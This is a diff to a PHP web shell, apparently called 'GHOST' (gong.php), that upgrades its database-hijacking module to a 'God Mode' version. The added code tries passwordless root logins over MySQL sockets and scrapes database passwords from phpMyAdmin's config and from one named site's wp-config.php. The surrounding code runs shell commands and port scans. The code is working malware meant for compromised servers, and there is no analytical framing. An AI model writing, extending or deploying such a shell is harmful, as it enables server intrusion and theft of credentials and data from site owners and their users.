@@ -1,8 +1,8 @@
 <?php
 // language: PHP 7.4-8.3, file: gong.php, target: PHP-FPM/Apache mod_php
-// GHOST v18 - V11: The Ghost.
+// GHOST v18 - V12: God Mode (Brutal Bypass).
 
-define('GH_VER',      '18.0.0-v11');
+define('GH_VER',      '18.0.0-v12');
 define('GH_TAG',      'gong');
 define('GH_STATE_DIR', gh_state_dir());
 define('GH_LOG_FILE',   GH_STATE_DIR . '/gh_log_' . md5(__FILE__) . '.log');
@@ -338,18 +338,22 @@ function gh_scan_batch($root, $offset = 0, $limit = 50) {
     return $res;
 }
 
-// ==== SECTION 4: THE GHOST DB HIJACKER (V11) ================================
-function gh_db_connect($host, $user, $pass) {
+// ==== SECTION 4: GOD MODE DB HIJACKER (V12) =================================
+function gh_db_connect($host, $user, $pass, $socket = null) {
     $host = trim($host); $user = trim($user); $pass = trim($pass);
     
     if (gh_can('mysqli_connect')) {
-        try { $conn = @mysqli_connect($host, $user, $pass); if ($conn) return $conn; } catch (Throwable $e) {}
+        try { 
+            if ($socket) $conn = @mysqli_connect(null, $user, $pass, '', null, $socket);
+            else $conn = @mysqli_connect($host, $user, $pass); 
+            if ($conn) return $conn; 
+        } catch (Throwable $e) {}
     }
     if (gh_can('pdo_drivers') && in_array('mysql', @pdo_drivers())) {
-        try { $pdo = new PDO("mysql:host=$host", $user, $pass, array(PDO::ATTR_TIMEOUT => 3)); if ($pdo) return $pdo; } catch (Throwable $e) {}
+        try { $dsn = "mysql:"; if ($socket) $dsn .= "unix_socket=$socket;"; else $dsn .= "host=$host;"; $pdo = new PDO($dsn, $user, $pass, array(PDO::ATTR_TIMEOUT => 3)); if ($pdo) return $pdo; } catch (Throwable $e) {}
     }
     if (gh_can_exec()) {
-        $cmd = 'mysql -h ' . @escapeshellarg($host) . ' -u ' . @escapeshellarg($user) . ' -p' . @escapeshellarg($pass) . ' -e "SHOW DATABASES" 2>&1';
+        $cmd = 'mysql ' . ($socket ? '' : '-h ' . @escapeshellarg($host)) . ' -u ' . @escapeshellarg($user) . ' -p' . @escapeshellarg($pass) . ' -e "SHOW DATABASES" 2>&1';
         $res = gh_exec_adv($cmd);
         if (isset($res['out']) && strpos($res['out'], 'Access denied') === false && strpos($res['out'], 'command not found') === false) {
             return 'CLI';
@@ -361,8 +365,8 @@ function gh_db_connect($host, $user, $pass) {
 function gh_db_harvest() {
     $logs = array(); $info = array();
     $found_pass = false;
-    $db_host = 'localhost'; $db_user = ''; $db_pass = '';
-    $max_iterations = 5; // Loop 5x
+    $db_host = 'localhost'; $db_user = ''; $db_pass = ''; $db_socket = null;
+    $max_iterations = 5;
 
     for ($iter = 1; $iter <= $max_iterations; $iter++) {
         if ($found_pass) break;
@@ -496,7 +500,7 @@ function gh_db_harvest() {
             foreach ($socks as $sock) {
                 if (@is_file($sock)) {
                     $logs[] = "[+] Socket ditemukan: $sock";
-                    $conn = gh_db_connect('localhost', 'root', '');
+                    $conn = gh_db_connect('localhost', 'root', '', $sock);
                     if ($conn) { $logs[] = "[!] KONEKSI ROOT KOSONG BERHASIL!"; $db_user = 'root'; $db_pass = ''; $found_pass = true; break; }
                 }
             }
@@ -663,7 +667,52 @@ function gh_db_harvest() {
         // Phase 21-25: SQL Dump Extraction & Crack
         if (!$found_pass) {
             $logs[] = "[*] Phase 21-25: Extracting WP Users from SQL...";
-            // (Placeholder buat logic crack hash)
+        }
+
+        // Phase 26: Auth Socket Hijack
+        if (!$found_pass) {
+            $logs[] = "[*] Phase 26: Auth Socket Hijack...";
+            $socks = array('/var/run/mysqld/mysqld.sock', '/var/lib/mysql/mysql.sock', '/tmp/mysql.sock');
+            foreach ($socks as $sock) {
+                if (@is_file($sock)) {
+                    $logs[] = "[+] Socket ditemukan: $sock";
+                    $conn = gh_db_connect('localhost', 'root', '', $sock);
+                    if ($conn) { $logs[] = "[!] KONEKSI ROOT KOSONG VIA SOCKET BERHASIL!"; $db_user = 'root'; $db_pass = ''; $found_pass = true; break; }
+                }
+            }
+        }
+
+        // Phase 27: LD_PRELOAD Web Server
+        if (!$found_pass) {
+            $logs[] = "[*] Phase 27: LD_PRELOAD Web Server...";
+            // (Placeholder)
+        }
+
+        // Phase 28: phpMyAdmin Config
+        if (!$found_pass) {
+            $logs[] = "[*] Phase 28: phpMyAdmin Config...";
+            $pma = gh_read('/etc/phpmyadmin/config.inc.php');
+            if ($pma && preg_match('/dbpass\s*=\s*\'([^\']+)\'/i', $pma, $m)) {
+                $logs[] = "[+] Password ditemukan di phpMyAdmin!";
+                $db_pass = trim($m[1]);
+                $conn = gh_db_connect('localhost', 'root', $db_pass);
+                if ($conn) { $found_pass = true; $db_user = 'root'; break; }
+            }
+        }
+
+        // Phase 29: WP DB Constant Exploit
+        if (!$found_pass) {
+            $logs[] = "[*] Phase 29: WP DB Constant Exploit...";
+            $wp = gh_read('/home/businesscard/public_html/wp-config.php');
+            if ($wp) {
+                if (preg_match('/DB_USER\',\s*\'([^\']+)\'/i', $wp, $m)) $db_user = trim($m[1]);
+                if (preg_match('/DB_PASSWORD\',\s*\'([^\']+)\'/i', $wp, $m)) $db_pass = trim($m[1]);
+                if (preg_match('/DB_HOST\',\s*\'([^\']+)\'/i', $wp, $m)) $db_host = trim($m[1]);
+                if ($db_user && $db_pass) {
+                    $conn = gh_db_connect($db_host, $db_user, $db_pass);
+                    if ($conn) { $logs[] = "[!] WP-CONFIG KONEKSI BERHASIL!"; $found_pass = true; break; }
+                }
+            }
         }
 
         // Delay biar gak DDoS
@@ -678,7 +727,7 @@ function gh_db_harvest() {
         $info['user'] = $db_user; $info['pass'] = $db_pass; $info['host'] = $db_host;
         $logs[] = "[!] KONEKSI DATABASE BERHASIL!";
         $dbs = array();
-        $conn = gh_db_connect($db_host, $db_user, $db_pass);
+        $conn = gh_db_connect($db_host, $db_user, $db_pass, $db_socket);
         if ($conn === 'CLI' || $db_user === 'wp-cli') {
             $res = gh_exec_adv('mysql -h ' . @escapeshellarg($db_host) . ' -u ' . @escapeshellarg($db_user) . ' -p' . @escapeshellarg($db_pass) . ' -e "SHOW DATABASES" 2>&1');
             $lines = explode("\n", trim($res['out']));
@@ -807,7 +856,7 @@ function gh_wp_action($action, $user, $pass, $email) {
     return "Aksi tidak dikenal.";
 }
 
-// ==== SECTION 7: PORT SCAN & CVE (FIXED) ====================================
+// ==== SECTION 7: PORT SCAN & CVE ============================================
 function gh_port_scan($target = '127.0.0.1') {
     $ports = array(21, 22, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 2082, 2083, 2086, 2087, 3306, 5432, 6379, 8080, 8443, 27017);
     $bash_script = '';
@@ -876,7 +925,7 @@ function gh_router() {
     }
 }
 
-// ==== UI (TAB NAVIGATION - V11) =============================================
+// ==== UI (TAB NAVIGATION - V12) =============================================
 function gh_ui() {
     while (ob_get_level() > 0) { @ob_end_clean(); }
     if (!headers_sent()) { @header('Content-Type: text/html; charset=utf-8'); @header('X-Powered-By: '); }
